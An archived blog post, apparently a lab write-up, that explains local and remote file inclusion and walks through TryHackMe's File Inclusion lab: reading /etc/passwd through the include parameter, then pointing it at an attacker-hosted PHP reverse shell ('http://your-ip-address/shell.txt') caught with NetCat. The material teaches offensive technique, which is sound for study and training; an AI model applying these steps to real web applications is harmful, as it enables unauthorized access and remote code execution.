# The Dark Art of RFI

- **Source URL:** https://medium.com/@burakhaseki04/the-dark-art-of-rfi-a-step-by-step-guide-to-obtaining-a-reverse-shell-9c5ae7a215bd?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250819151248/https://medium.com/@burakhaseki04/the-dark-art-of-rfi-a-step-by-step-guide-to-obtaining-a-reverse-shell-9c5ae7a215bd
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1128 (id 1128)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# The Dark Art of RFI: A Step-by-Step Guide to Obtaining a Reverse Shell!

Hello lamers, today we will talk about file inclusion and how to use a remote file inclusion (**RFI**) vulnerability to gain a reverse shell.

# **File Inclusion**

File inclusion is a technique that allows a web application to include external files as part of its functionality. This can be useful for a variety of purposes, such as including common libraries or modules, or for separating different parts of an application into separate files.

There are two main types of file inclusion: local file inclusion (**LFI**) and remote file inclusion (**RFI**). Local file inclusion occurs when an application includes files that are stored locally on the same system as the application. Remote file inclusion, on the other hand, occurs when an application includes files that are stored on a remote system, accessed through a network connection.

Both **LFI** and **RFI** can be vulnerable to attack if proper security measures are not in place. In the case of **LFI**, an attacker may be able to manipulate input in order to include malicious files or access sensitive files on the system. **RFI** vulnerabilities can be exploited by injecting malicious code into a web application through the use of user input, allowing an attacker to potentially gain unauthorized access to the system or execute arbitrary code.

To prevent against file inclusion attacks, it is important to properly sanitize user input and restrict the types of files that can be included by the application. It is also a good idea to regularly review and update the application’s security measures to ensure that it is protected against potential vulnerabilities.

# **How to use a remote file inclusion (RFI) vulnerability to gain a reverse shell?**

I’ll use TryHackMe’s “**File Inclusion**” Lab to demonstrate it in action. As you can see, there is a input form for include a file.

Let’s type something and see the url.

If there is a file inclusion vulnerability here, if I delete ‘**asd**’ and type ‘**/etc/passwd/**’ I should be able to see the contents of this file. Of course, some filters may have been put in order to prevent this situation, but this is not our topic.

As you can see, we can read the ‘**passwd**’ file. Let’s get to the reverse shell part. First of all, i need a php shell on my apache server. I used [pentestmonkey’s PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). After i changed ip adress and port from the source code, copied it to ‘**/var/www/html**’ folder as ‘**shell.txt**’. And finally, i started my apache2 server by typing ‘**service apache2 start**’ to terminal.

Now, we need to listen to the port we selected. Let’s use **NetCat** for listening the port.

Lastly, type “**http://your-ip-address/shell.txt”** to the file path.

That’s it. We are in :)
